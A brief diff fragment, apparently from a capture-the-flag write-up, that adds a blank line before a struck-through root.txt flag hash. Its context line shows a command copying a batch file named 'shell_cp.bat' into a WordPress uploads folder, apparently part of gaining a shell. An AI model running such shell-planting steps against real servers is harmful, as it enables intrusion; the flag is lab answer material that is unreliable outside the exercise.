@@ -245,4 +245,5 @@ js_cpy.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell_cp.bat 
 ## And we are done.
 
 root.txt:
+
 	~~6e9a9fdc6f64e410a68b847bb4b404fa~~
